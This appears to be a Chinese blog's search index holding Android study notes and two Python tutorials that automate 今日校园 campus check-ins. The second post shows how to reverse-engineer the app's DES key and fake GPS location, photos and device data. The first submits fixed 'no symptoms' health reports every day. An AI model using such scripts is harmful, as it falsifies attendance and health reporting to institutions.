<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Android编程权威指南学习笔记(8-14)]]></title>
    <url>%2F2020%2F03%2F30%2FAndroid%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8-14%2F</url>
    <content type="text"><![CDATA[上一篇笔记学到了第7章，由于内容较多，所以将分成多篇文章记录学习内容。这篇文章将记录第8到第14章节的内容 第八章 使用RecyclerView显示列表单例与数据集中存储要创建单例，需创建一个带有私有构造方法及get()方法的类。如果实例已存在， get()方法就直接返回它；如果实例还不存在， get()方法就会调用构造方法创建它。 1234567891011public class CrimeLab &#123; private static CrimeLab sCrimeLab; public static CrimeLab get(Context context) &#123; if (sCrimeLab == null) &#123; sCrimeLab = new CrimeLab(context); &#125; return sCrimeLab; &#125; private CrimeLab(Context context) &#123; &#125;&#125; 首先，注意sCrimeLab变量的s前缀。这是Android开发的命名约定，一看到此前缀，我们就知道sCrimeLab是一个静态变量。 其次，再来看CrimeLab的私有构造方法。显然，其他类无法创建CrimeLab对象，除非调用get()方法。 最后，在get()方法里，我们传入的是Context对象（第14章会用到）。 RecyclerView、 ViewHolder 和 AdapterRecyclerViewRecyclerView是ViewGroup的子类，每一个列表项都是作为一个View子对象显示的。RecyclerView所做的就是回收再利用，循环往复 ViewHolderViewHolder只做一件事：容纳View视图。如图： RecyclerView自 身 不 会 创 建 视 图 ， 它 创 建 的 是 ViewHolder， 而 ViewHolder 引 用 着itemView： AdapterAdapter是一个控制器对象，从模型层获取数据，然后提供给RecyclerView显示，是沟通的桥梁 Adapter负责： ​ ①. 创建必要的ViewHolder； ​ ②. 绑定ViewHolder至模型层数据。 使用RecyclerView RecyclerView类来自于Google支持库。要使用它，首先要添加RecyclerView依赖库。单击File→Project Structure....菜单项切换至项目结构窗口，选择左边的app模块，然后单击Dependencies选项页。单击+按钮弹出依赖库添加窗口。找到并选择recyclerview-v7支持库，单击OK按钮完成依赖库添加。如图： 配置CrimeListFragment的视图文件，根视图使用RecyclerView。 修改CrimeListFragment类文件，使用布局并找到布局中的RecyclerView视图： 12345678@Nullable@Overridepublic View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) &#123; View v = inflater.inflate(R.layout.fragment_crime_list, container, false); mCrimeRecyclerView = v.findViewById(R.id.crime_recycler_view); mCrimeRecyclerView.setLayoutManager(new LinearLayoutManager(getActivity())); return v;&#125; 注意，没有LayoutManager的支持，不仅RecyclerView无法工作，还会导致应用崩溃。所以， RecyclerView视图创建完成后，就立即转交给了LayoutManager对象。 LayoutManager负责在屏幕上摆放列表项和定义屏幕滚动行为。 这里使用的是LinearLayoutManager类，它支持以竖直列表的形式展示列表项；还有GridLayoutManager类，以网格形式展示列表项。 到这里运行应用，看到的是一个RecyclerView空视图。要显示出crime列表项，还需要完成Adapter和ViewHolder的实现 列表项视图新建列表项的布局文件list_item_crime 实现 ViewHolder 和 Adapter到这一步发现了一些书中的问题，书中说到： 但在我使用的Android Studio 3.5中，自动生成的构造方法却是一个参数的： 这是为什么呢？因为Google将实例化 list_item_crime 布局的过程挪到了之后实现 Adapter 的onCreateViewHolder 方法。也就是说，我们需要做的就是将书中原本在 CrimeHolder实例化 list_item_crime 的过程挪到 onCreateViewHolder 方法之中 代码如下： 接下来创建Adapter，需要显示新创建的ViewHolder或让Crime对象和已创建的ViewHolder关联时， RecyclerView会去找Adapter（调用它的方法）。 RecyclerView不关心也不了解具体的Crime对象，这是Adapter要做的事 接下来，在CrimeAdapter中实现三个方法： 123456789101112131415@NonNull@Overridepublic CrimeHolder onCreateViewHolder(@NonNull ViewGroup viewGroup, int i) &#123; View view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime, viewGroup, false); return new CrimeHolder(view);&#125;@Overridepublic void onBindViewHolder(@NonNull CrimeHolder crimeHolder, int i) &#123;&#125;@Overridepublic int getItemCount() &#123; return mCrimes.size();&#125; (注意：onCreateViewHolder方法已经添加了上文的修改内容) RecyclerView需要新的ViewHolder来显示列表项时，会调用onCreateViewHolder方法。在这个方法内部，我们创建一个LayoutInflater，然后用它创建CrimeHolder 搞定了Adapter，最后要做的就是将它和RecyclerView关联起来。实现一个设置CrimeListFragment用户界面的updateUI方法，该方法创建CrimeAdapter，然后设置给RecyclerView 绑定列表项CrimeHolder还需要一个bind(Crime)方法： 1234567private Crime mCrime;···public void bind(Crime crime)&#123; mCrime = crime; mTitleTextView.setText(crime.getTitle()); mDateTextView.setText(crime.getDate().toString());&#125; 每次有新的Crime要在CrimeHolder中显示时，都要调用它一次，并在Adapter中的onbindViewHolder方法中使用它： 12345@Overridepublic void onBindViewHolder(@NonNull CrimeHolder crimeHolder, int i) &#123; Crime crime = mCrimes.get(i); crimeHolder.bind(crime);&#125; 最后运行效果将会显示每个Crime的Title和Date 响应点击我们通过修改CrimeHolder类来处理用户点击事件: 123456789101112131415private class CrimeHolder extends RecyclerView.ViewHolder implements View.OnClickListener &#123; ··· private Crime mCrime; public CrimeHolder(@NonNull View itemView) &#123; super(itemView); ··· itemView.setOnClickListener(this); &#125; @Override public void onClick(View v) &#123; Toast.makeText(getActivity(),mCrime.getTitle() + "Clicked", Toast.LENGTH_SHORT).show(); &#125;&#125; 挑战练习： RecyclerView ViewType请在RecyclerView中创建两类列表项：一般性crime，以及需警方介入的crime。要完成这个挑战，你需要用到RecyclerView.Adapter的视图类别功能（ view type）。在Crime对象里，再添加一个mRequiresPolice实例变量，使用它并借助getItemViewType(int)方法（ https://developer.android.com/reference/android/support/v7/widget/RecyclerView.Adapter.html#getItemViewType(int)），确定该加载哪个视图到`CrimeAdapter`。在onCreateViewHolder(ViewGroup, int)方法里，基于getItemViewType(int)方法返回的viewType值，需要返回不同的ViewHolder。如果是一般性crime，就仍然使用原始布局；如果是需警方介入的crime，就使用一个带联系警方按钮的新布局 新建需警方介入的crime列表项视图list_item_crime_police： 12345678910111213141516171819202122232425262728293031323334&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:padding="8dp"&gt; &lt;LinearLayout android:layout_width="wrap_content" android:layout_height="wrap_content" android:orientation="vertical"&gt; &lt;TextView android:id="@+id/crime_title" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Crime Title" /&gt; &lt;TextView android:id="@+id/crime_date" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Crime Date" /&gt; &lt;/LinearLayout&gt; &lt;TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:textSize="20dp" android:gravity="right" android:textColor="#ff0000" android:text="Police"/&gt;&lt;/LinearLayout&gt; 在Crime类中添加是否报警的属性： 12345678// 是否报警private boolean mRequiresPolice;public boolean isRequiresPolice() &#123; return mRequiresPolice;&#125;public void setRequiresPolice(boolean requiresPolice) &#123; mRequiresPolice = requiresPolice;&#125; 在CrimeLab中设置每隔3项需要报警： 1234567891011private CrimeLab(Context context) &#123; mCrimes = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) &#123; Crime crime = new Crime(); crime.setTitle("Crime # " + i); crime.setSolved(i % 2 == 0); // 设置每隔2项需要报警 crime.setRequiresPolice(i % 3 == 0); mCrimes.add(crime); &#125;&#125; 修改CrimeListFragment类： 123456789101112131415161718192021222324252627282930313233343536373839404142// 删除泛型private class CrimeAdapter extends RecyclerView.Adapter &#123; private List&lt;Crime&gt; mCrimes; public CrimeAdapter(List&lt;Crime&gt; crimes) &#123; mCrimes = crimes; &#125; // 重写方法 @Override public int getItemViewType(int position) &#123; if (mCrimes.get(position).isRequiresPolice())&#123; return 1; &#125; else &#123; return 0; &#125; &#125; @NonNull @Override public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup viewGroup, int type) &#123; View view; // 分情况展示视图 if (type == 0)&#123; view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime, viewGroup, false); &#125; else &#123; view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime_police, viewGroup, false); &#125; return new CrimeHolder(view); &#125; @Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder viewHolder, int i) &#123; Crime crime = mCrimes.get(i); ((CrimeHolder) viewHolder).bind(crime); &#125; @Override public int getItemCount() &#123; return mCrimes.size(); &#125;&#125; 最终效果： 第九章 使用布局与组件创建用户界面2020年03月30日更新至此]]></content>
      <categories>
        <category>Android开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[今日校园自动签到]]></title>
    <url>%2F2020%2F03%2F25%2F%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%2F</url>
    <content type="text"><![CDATA[本文将探讨如何对今日校园发起的签到进行定时回应，即自动签到，同时了解使用Python进行阿里云oss的文件上传、Python的DES加解密库、逆向分析Android应用获取关键信息（本文涉及DES加解密的密钥和IV向量的获取）等 前言在上一篇文章中，我们讨论了如何进行今日校园的自诊打卡，但是后面经过测试发现，如果手机端重新登录，则原有的Cookie将失效，需要重新更新Cookie，所以最好在手机端登录后将Cookie填入程序里后，不要再退出登录，这样自动打卡就可以一直进行。而这篇今日校园自动签到，将不存在这一问题。当Cookie已经失效时，将自动进行重新登陆以更新Cookie，同时还可自定义签到位置，使你一直在其签到范围内 分析过程阿里云OSS上传文件今日校园里面的签到很多时候都是需要自拍的，而这些图片会被今日校园保存到阿里云OSS中，所以我们必须实现Python使用阿里云OSS的过程 pip install oss2 你需要有如下数据： access_key_id、access_key_secret、endPoint、bucket 本文的这些数据均通过抓包获得 编写代码 12345678910111213141516171819202122232425262728def uploadPic(session): """ 上传图片到阿里云oss url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' # 用于获取主要参数 method: POST :param session: requests.session() :return: oss上的filename """ # 抓包获取文件上传所需信息 url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' res = session.post(url=url, verify=False) datas = res.json().get('datas') # 所需信息 filename = datas.get('fileName') accessKeyId = datas.get('accessKeyId') accessSecret = datas.get('accessKeySecret') securityToken = datas.get('securityToken') endPoint = datas.get('endPoint') bucket = datas.get('bucket') # 创建对象 bucket = oss2.Bucket(oss2.Auth(access_key_id=accessKeyId, access_key_secret=accessSecret), endPoint, bucket) # 读取home.jpg并上传到oss上的filename with open('home.jpg', "rb") as f: data = f.read() bucket.put_object(key=filename, headers=&#123;'x-oss-security-token': securityToken&#125;, data=data) # 返回值为链接，参数依次为，方法、oss上文件路径、过期时间(s) ret = bucket.sign_url('PUT', filename, 60) return filename DES加解密反编译该App的部分代码可以看出，今日校园许多关键信息均使用DES加密，且加密所需的IV向量为byte类型的数组{1,2,3,4,5,6,7,8}： 所以，我们提交这些信息也必须经过加密，而DES加密的密钥也能从相应的代码中分析得到:ST83=@XV 在最新的v8.1.12更新日志中，提到了对软件的安全机制进行了加强： 经过分析，发现确实如此，今日校园App开始使用360加固进行安全防护，但在我之前使用的v8.1.7中，是可以直接分析其没有经过加固的代码的。而对于360加固过的应用如何进行逆向分析不是本文的重点，有机会将在以后的文章中进行讨论如何对其脱壳 所以在得到这些关键信息后就可进行DES加密部分的代码编写了： 12345678# pip install pyDesdef encrypt(s, key='ST83=@XV'): import pyDes key = key iv = b"\x01\x02\x03\x04\x05\x06\x07\x08" k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(s) return base64.b64encode(EncryptStr).decode() 其他文件 config.ini 为了实现自动登录，我们需要一个名为config.ini的文件保存我们的Cookie，以便在未失效时直接使用，在失效时更新。该文件只保存MOD_AUTH_CAS字段的内容 home.jpg 除此之外，还需要一张你的签到图片home.jpg，以便在签到时上传该文件 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286import base64import jsonimport reimport timeimport oss2import requestsimport urllib3from pyDes import *from requests.utils import dict_from_cookiejarurllib3.disable_warnings()session = requests.session()session.headers = &#123; 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 yiban/8.1.7 cpdaily/8.1.7 wisedu/8.1.7',&#125;# 此处配置你的账号USERCODE = '201707060000'# 此处配置你的密码USERPWD = '123456'# 此处填写最新的App版本APP_VERSION = '8.1.12'# 签到模式 custom：自定义位置；auto: 自动获取第一个签到范围内的位置MOD = 'custom'# 此处填写你的签到地址信息POSITION = '中国山东省潍坊市寿光市'# 当签到模式为custom时有效# 此处填写地址经纬度LON = 118.785300LAT = 36.889072# 如果准备签到的位置在签到范围外，则在此处填写原因REASON = '原因'# des加密def encrypt(s, key='ST83=@XV'): key = key iv = b"\x01\x02\x03\x04\x05\x06\x07\x08" k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(s) return base64.b64encode(EncryptStr).decode() # 转base64编码返回def createCpdailyInfo(lon, lat, open_id): """ headers中的CpdailyInfo参数 :param lon: 定位经度 :param lat: 定位纬度 :param open_id: 学生学号 :return: CpdailyInfo """ s = r'&#123;"systemName":"android","systemVersion":"8.1.0","model":"16th",' \ r'"deviceId":"ffd1df5b-e69a-4938-9624-38d575039f83","appVersion":"8.1.11","lon":' + str( lon) + ',"lat":' + str(lat) + ',"userId":"' + open_id + '"&#125;' info = encrypt(s) return infodef uploadPic(): """ 上传图片到阿里云oss url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' method: POST :return: oss上的filename """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' res = session.post(url=url, verify=False) datas = res.json().get('datas') filename = datas.get('fileName') accessKeyId = datas.get('accessKeyId') accessSecret = datas.get('accessKeySecret') securityToken = datas.get('securityToken') endPoint = datas.get('endPoint') bucket = datas.get('bucket') # 创建对象 bucket = oss2.Bucket(oss2.Auth(access_key_id=accessKeyId, access_key_secret=accessSecret), endPoint, bucket) # 读取test.jpg并上传到oss上的filename with open('home.jpg', "rb") as f: data = f.read() bucket.put_object(key=filename, headers=&#123;'x-oss-security-token': securityToken&#125;, data=data) # 返回值为链接，参数依次为，方法、oss上文件路径、过期时间(s) ret = bucket.sign_url('PUT', filename, 60) return filenamedef getSignInfoInOneDay(): """ :url: https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStuSignInfosInOneDay :method: POST :data: &#123;&#125; """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStuSignInfosInOneDay' data = json.dumps(&#123;&#125;) res = session.post(url=url, data=data, allow_redirects=False, verify=False) if res.status_code == 302: print('登录过期') return None datas = res.json().get('datas', &#123;&#125;) signedTasks = datas.get('signedTasks') unSignedTasks = datas.get('unSignedTasks') tasks = &#123;'signedTasks': signedTasks, 'unSignedTasks': unSignedTasks&#125; return tasksdef getSignDetail(us_task): """ 签到任务详情 url: https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/detailSignInstance method: POST :param us_task: 未签到的任务 data: &#123; signInstanceWid: signInstanceWid, signWid: signWid &#125; data-type: json """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/detailSignInstance' data = json.dumps(&#123; 'signInstanceWid': us_task.get('signInstanceWid'), 'signWid': us_task.get('signWid'), &#125;) res = session.post(url=url, data=data, verify=False) unSignedTaskDetail = res.json().get('datas') return unSignedTaskDetaildef getPhotoUrl(filename): """ 获取图片上传位置 url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/previewAttachment' method: POST :param filename: 文件路径 data: &#123;ossKey: 文件路径&#125; data-type: json :return: 图片上传位置 """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/previewAttachment' data = json.dumps(&#123; 'ossKey': filename &#125;) res = session.post(url=url, data=data, verify=False) photoUrl = res.json().get('datas') return photoUrldef submitSign(wid, lon, lat, reason, photo_url, position): """ 提交签到 url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/submitSign' method: POST :param wid: 任务id string :param lon: 经度 float :param lat: 纬度 float :param reason: 补充原因 string :param photo_url: 签到图片url string :param position: 位置信息 string :return: """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/submitSign' data = json.dumps(&#123; 'signInstanceWid': wid, 'longitude': lon, 'latitude': lat, 'isMalposition': 1, 'abnormalReason': reason, 'signPhotoUrl': photo_url, 'position': position &#125;) cpdaily_extension = createCpdailyInfo(lon=lon, lat=lat, open_id=USERCODE) session.headers['Content-Type'] = 'application/json;charset=UTF-8' res = session.post(url=url, headers=&#123;'Cpdaily-Extension': cpdaily_extension&#125;, data=data, verify=False) message = res.json().get('message') return messagedef startSign(): """ 签到流程控制 :return: """ tasks = getSignInfoInOneDay() text = '' if tasks is None: if reLogin(): print('==&gt;重新登陆成功') text += '==&gt;重新登陆成功' mod = dict_from_cookiejar(session.cookies).get('MOD_AUTH_CAS') with open('cookie.ini', 'w+', encoding='utf-8') as f: f.write(mod) session.cookies['MOD_AUTH_CAS'] = mod tasks = getSignInfoInOneDay() else: text += '==&gt;账号或密码错误、或者需要验证码' return text unSignedTasks = tasks.get('unSignedTasks') if unSignedTasks: print('当前有&#123;&#125;条签到'.format(len(unSignedTasks))) print('开始签到') for unSignedTask in unSignedTasks: unSignedDetailTask = getSignDetail(us_task=unSignedTask) # 判断是否在签到时间 currentTime = unSignedDetailTask.get('currentTime') taskDate = unSignedDetailTask.get('rateSignDate')[0:10] taskStartTime = unSignedDetailTask.get('rateTaskBeginTime') taskEndTime = unSignedDetailTask.get('rateTaskEndTime') dt1 = '&#123;&#125; &#123;&#125;'.format(taskDate, taskStartTime) dt2 = '&#123;&#125; &#123;&#125;'.format(taskDate, taskEndTime) timeArray1 = time.strptime(dt1, '%Y-%m-%d %H:%M') timeArray2 = time.strptime(dt2, '%Y-%m-%d %H:%M') timeArray3 = time.strptime(currentTime, '%Y-%m-%d %H:%M:%S') timestamp1 = time.mktime(timeArray1) timestamp2 = time.mktime(timeArray2) timestamp3 = time.mktime(timeArray3) if timestamp3 &lt;= timestamp1 or timestamp3 &gt;= timestamp2: print("未到签到时间") text += '==&gt;未到签到时间' break filename = uploadPic() photo_url = getPhotoUrl(filename=filename) # 地址信息 reason = '' if MOD == 'custom': longitude = LON latitude = LAT reason = REASON else: place = unSignedDetailTask.get('signPlaceSelected')[0] longitude = place.get('longitude') latitude = place.get('latitude') text += "==&gt;" + submitSign(wid=unSignedDetailTask.get('signInstanceWid'), lon=longitude, lat=latitude, reason=reason, photo_url=photo_url, position=POSITION) session.get('https://sc.ftqq.com/**********你server酱的SCKEY**********.send?text=今日校园签到&amp;desp=' + text) return text else: print("暂时没有签到任务") return '==&gt;暂时没有签到任务'def reLogin(): """ 重新登陆 :return: 成功True/失败False """ url = 'https://wfust.cpdaily.com/iap/doLogin' # POST lt_url = 'https://wfust.cpdaily.com/iap/login?service=https%3A%2F%2Fwfust.cpdaily.com%2Fportal%2Flogin' # GET lt_compile = re.compile(r'id="lt" value="(.*?)"') headers = &#123; 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://wfust.cpdaily.com/iap/login?service=https%3A%2F%2Fwfust.cpdaily.com%2Fportal%2Flogin' &#125; text = session.get(url=lt_url, verify=False).text lt = lt_compile.findall(text)[0] data = &#123; # 此处配置你的账号 'username': USERCODE, # 此处配置你的密码 'password': USERPWD, 'lt': lt, 'captcha': '', 'rememberMe': 'false' &#125; res = session.post(url=url, headers=headers, data=data, verify=False) re_url = res.json().get('url') if re_url is not None: resp = session.post(url=re_url, headers=headers, data=data, verify=False) if resp.status_code == 200: return True return False else: return Falseif __name__ == '__main__': with open('cookie.ini', 'r', encoding='utf-8') as f: read = f.read() if read != '': session.cookies['MOD_AUTH_CAS'] = read text = startSign() session.get( 'https://sc.ftqq.com/**********你server酱的SCKEY**********.send?text=今日校园签到&amp;desp=' + text) 在云函数中部署具体步骤参考上一篇文章：Python+云函数实现今日校园每日自诊打卡 需要注意的是，你需要在云函数里安装依赖包，当然直接把依赖包打包上传也可以。除此之外，你还可以在服务器里面部署定时任务 最后关于上一篇文章挖的几个坑，我还没有填完，待我时间充裕或者我真的需要的时候再填吧！ 国内疫情已经基本稳定，估计开学那天已经快来了！]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python+云函数实现今日校园每日自诊打卡]]></title>
    <url>%2F2020%2F03%2F22%2FPython-%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E6%AF%8F%E6%97%A5%E8%87%AA%E8%AF%8A%E6%89%93%E5%8D%A1%2F</url>
    <content type="text"><![CDATA[科技改变生活，懒人重塑世界，这是一段可以让你早睡早起的健康绿色python代码 起因相信你也和我一样，每日在今日校园这个爱啪啪里准时进行自诊打卡。但是有时候难免会出现忘记打卡的情况，所以这个程序就诞生了 准备工作 你需要有你的Cookie(下文会说明) 你需要有阿里云或者腾讯云等提供云函数服务的服务商的账号 如果你需要微信实时通知打卡的情况，那么你必须有一个Server酱的SCKEY Python脚本那么程序怎么知道是你在打卡而不是郭涛在打卡呢？ 是的，服务器需要Cookie进行识别你的身份，就像我们每个人的身份证号码都不相同，我们的Cookie也是不同的，所以使用这个程序的前提条件是你懂的怎样抓取你的Cookie 当然，我们并不是需要用到所有的Cookie，仅仅需要用到其中的sessionToken就能使用了 所以请自行替换脚本中的Cookie： 如果你想要实现微信通知打卡执行的状态，请在requests.get(&#39;https://sc.ftqq.com/你server酱的SCKEY.send?text=今日校园自诊打卡&amp;desp=&#39;+msg, verify=False)里相应位置填写你的SCKEY 如果不需要或者完全不知道怎样弄，那么你完全可以大胆的删除这一行代码，而程序不会出现任何逻辑上的问题 对于需要上传的数据，它们分别为： fever：是否有呼吸道感染症状，如：1（无） contact：是否与敏感/疑似/确诊人员接触过，如：0（否） province：你所在的省份，如：四川省 city：你所在的城市，如：南充市 prefecture：你所在的县市区，如：仪陇县 请确保以上数据和你以前打卡的数据一致 源码1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding: utf-8 -*-import requests, jsonimport urllib3urllib3.disable_warnings()session = requests.session()# 打卡url = 'https://mobile.campushoy.com/v6/epidemic/putEpidemicInfo' # POST OPTION# 获取打卡详情get_detail_url ='https://mobile.campushoy.com/v6/epidemic/getEpidemicInfo' # GETheaders = &#123; 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 yiban/8.1.7 cpdaily/8.1.7 wisedu/8.1.7', 'Cookie': 'sessionToken=此处填写你的sessionToken'&#125;session.headers.update(headers)def daka(): data = json.dumps(&#123; 'fever': '1', # 是否有呼吸道感染症状：1无； 'contact': '0', # 是否与敏感/疑似/确诊人员接触过：0否； 'province': '四川省', # 你所在的省份 'city': '南充市', # 你所在的城市 'prefecture': '仪陇县' # 你所在的县市区 &#125;) res = session.post(url=url, data = data, verify=False) status = res.json().get('errMsg') return statusdef getEpidemicInfo(): res = session.get(url=get_detail_url, verify=False) info = res.json().get('data', '') # print(info) msg = res.json().get('errMsg', 'failed') updateTime = info.get('updateTime', '') return updateTimedef start(): status = daka() time = getEpidemicInfo() msg = status + '(打卡时间：' + time + ')' print(msg) requests.get('https://sc.ftqq.com/你server酱的SCKEY.send?text=今日校园自诊打卡&amp;desp='+msg, verify=False) 云函数的设置这里以阿里云的函数计算为例，其他服务商应该操作类似 打开阿里云的函数计算，找到服务-函数，选择新建函数 设置函数名称，运行环境（必须选择python3），函数入口和运行内存 编辑代码 创建触发器 设置触发器 完成效果当你一切都准备好了以后，你只需要每天关注是否有打卡失败的消息发送给你，每当出现这种情况，一般都是Cookie已经失效了，你需要去云函数里更新你的Cookie设置 最后，好好享受属于你的早晨吧！ 结语相信你也感觉到了使用起来并不简单，还需要自己抓Cookie这种操作。不过不用担心，强迫症使我不会允许这种问题一直存在，目前登录功能和签到功能正在开发中，相信不久就能和大家见面了！]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android编程权威指南学习笔记（1-7）]]></title>
    <url>%2F2020%2F03%2F18%2FAndroid%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-7%2F</url>
    <content type="text"><![CDATA[最近准备学习安卓开发，选择学习书籍的时候，在《第一行代码》第2版和《Android编程权威指南》第3版之间选择了后者，这篇文章将记录下学习过程中的重点和我学习中遇到的问题 第一章 Android开发初体验定制Toast使用Toast类的setGravity方法 123Toast.makeText(MainActivity.this,R.string.incorrect_toast,Toast.LENGTH_SHORT);toast.setGravity(Gravity.TOP,0,50);toast.show(); 第二章 MVC设计模式配置Android Studio识别成员变量的m前缀 File → Settings → Editor→ Code Style→ Code Generation 在Naming表单的Field一行中，添加m作为前缀 ; 添加s作为Static field的前缀 作用需要Android Studio为mText生成get方法时，它生成的是getText()而不是getMText() 模型、视图、控制器 模型对象模型对象存储着应用的数据和业务逻辑 模型对象不关心用户界面，它为存储和管理应用数据而生 模型类通常就是我们创建的定制类 应用的全部模型对象组成了模型层 视图对象视图对象知道如何在屏幕上绘制自己，以及如何响应用户的输入 凡是能够在屏幕上看见的对象，就是视图对象 自带很多视图类 可自己定制开发其他视图类 应用的全部视图对象组成了视图层 控制器对象控制器对象含有应用的逻辑单元，是视图对象与模型对象的联系纽带 控制器通常是Activity、 Fragment或Service的子类 MVC设计模式的优点 可以按类而不是按变量和方法思考设计开发问题 可以按层而非一个个类来考虑设计开发 便于复用类 ImageViewandroid:contentDescription属性 该属性能为视力障碍用户提供方便 设置文字属性值后，如果设备的可访问性选项作了相应设置，那么在用户点击图形按钮时，设备便会读出属性值的内容 第三章 Activity的生命周期每个Activity实例都有其生命周期。在其生命周期内， activity在运行、暂停、停止和不存在这四种状态间转换 覆盖onCreate(Bundle)方法可以完成的工作切记，千万不要自己去调用onCreate(Bundle)方法或任何其他activity生命周期方法 实例化组件并将它们放置在屏幕上（调用setContentView(int)方法） 引用已实例化的组件 为组件设置监听器以处理用户交互 访问外部模型数据 使用@Override注解就是要求编译器保证当前类拥有你要覆盖的方法，而不会出现因拼写错误等而出现奇怪的问题 部分手机Log日志不输出国内的部分厂商定制的手机对于应用中的 Log 日志默认做了打印限制，需要手动设置才能打印出特殊级别的日志 魅族打开【设置】中的【开发者选项】，页面底部找到【性能优化】，打开【高级日志输出】，勾选【全部允许】 华为打开拨号界面的拨号盘，输入##2846579##，系统会自动打开【工程菜单】界面，依次打开【后台设置】 -&gt; 【LOG设置】，勾选【AP日志】即可 设备旋转屏幕时设备旋转时，系统会销毁当前Activity实例，创建一个新的Activity实例 改变设备配置（ device configuration） 新建landscape资源 Bundle对象Bundle是存储字符串键与限定类型值之间映射关系（键值对）的一种结构 只能是基本类型 可以实现Serializable或Parcelable接口的对象 第四章 Android应用的调试异常与栈跟踪 直接查看崩溃日志 记录栈跟踪日志 1Log.d(TAG, MSG,new Exception()); 设置断点 使用异常断点 ① 打开Run - View Breakpoints 或者使用快捷键c+s+f8 ② 单击新增断点按钮（＋）设置一个新断点 ③ 选择下拉列表中的Java Exception Breakpoints选项 ④ 输 入 RuntimeException并选择RuntimeException是NullPointerException、 ClassCastException及其他常见异常的超类，因此该设置基本适用于所有异常 ⑤ 点击Done按钮完成设置 ⑥ 调试应用 Android特有的调试工具Android Lint选择Analyze → Inspect Code… R类经常清理：Build → Clean Project 第五章 第二个activityxml文件tools:text属性的命名空间会在预览时显示文字内容，而在运行时不会显示 c+s+n以快速打开某一文件AndroidManifes.xmlandroid:name: 必须属性，表示activity文件路径 启动activity实际过程activity调用startActivity(Intent)方法时，调用请求发送给了操作系统的ActivityManager，ActivityManager负责创建Activity实例并调用其onCreate(Bundle)方法 基于Intent的通信intent对象是component用来与操作系统通信的一种媒介工具 component activity service broadcast receiver content provider intent是一种多用途通信工具显式intent与隐式intent显式intent通过指定Context与Class对象，然后调用intent的构造方法来创建的Intent 隐式intent一个应用的activity如需启动另一个应用的activity，可通过创建隐式intent来处理 activity间的数据传递intent extra extra是一种键值结构 将extra数据信息添加给intent public Intent putExtra(String name, boolean value) activity可能启动自不同的地方，所以，应该在获取和使用extra信息的activity那里，为它定义键 1private static final String EXTRA_ANSWER_IS_TRUE = "com.suqir.android.geoquiz.answer_is_true";// 可避免来自不同应用的extra间发生命名冲突 newIntent(...)方法中封装处理extra信息的逻辑 12345public static Intent newIntent(Context pakageContext, boolean answerIsTrue)&#123; Intent intent = new 